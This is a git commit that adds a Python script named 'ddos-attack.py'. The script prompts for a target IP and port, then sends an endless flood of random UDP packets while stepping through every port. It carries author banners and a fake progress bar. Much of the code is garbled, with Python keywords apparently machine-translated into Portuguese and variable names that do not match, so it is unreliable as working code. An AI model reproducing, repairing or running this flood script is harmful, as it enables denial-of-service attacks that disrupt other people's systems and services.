052272576f8c28c9dc00ef89ddb5b65dd3a61660
Elbielzinho <59930738+Elbielzinho@users.noreply.github.com>
2020-04-28 18:50:20 -0300

    Create ddos-attack.py

---
+++ ddos-attack.py
@@ -0,0 +1,55 @@
+sys de importação
+importação os
+hora de importação
+soquete de importação
+importação aleatória
+#Code Time
+from datetime importar datetime
+now = datetime . now ()
+hora = agora . hora
+minuto = agora . minuto
+dia = agora . dia
+mês = agora . mês
+ano = agora . ano
+
+##############
+meia = soquete . soquete ( soquete . AF_INET , soquete . SOCK_DGRAM )
+bytes = aleatório . _urandom ( 1490 )
+##############
+
+os . sistema ( "claro" )
+os . sistema ( "figlet DDos Attack" )
+
+print "Autor: Elbielzinho"
+print "You Tube: https://www.youtube.com/channel/UCHK8iGN6tADdNULTqIZcqNw
+"
+print "github: https://github.com/Elbielzinho"
+print "PARA POUCOS SEREM IMORTAIS MUITOS TÊM QUE MORRER"
+impressão
+ip = raw_input ( "IP:" )
+port = input ( "Porta:" )
+
+os . sistema ( "claro" )
+os . sistema ( "figlet Attack Starting" )
+imprimir "[] 0%"
+hora . sono ( 5 )
+imprimir "[=====] 25%"
+hora . sono ( 5 )
+print "[==========] 50%"
+hora . sono ( 5 )
+print "[===============] 75%"
+hora . sono ( 5 )
+print "[===================] 99%"
+hora . sono ( 5 )
+print "[≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠] FAILL"
+hora . sono ( 5 )
+print "[====================] 100%"
+hora . dormir ( 3 )
+enviado = 0
+enquanto True : 
+           meia . sendto ( bytes , ( ip , porta ))
+           enviado = enviado + 1
+           port = port + 1
+           print "Enviou% s DDoS-Packet para% s pela Porta:% s" % ( enviada , ip , porta )
+           se porta == 65534 :
+               port = 1
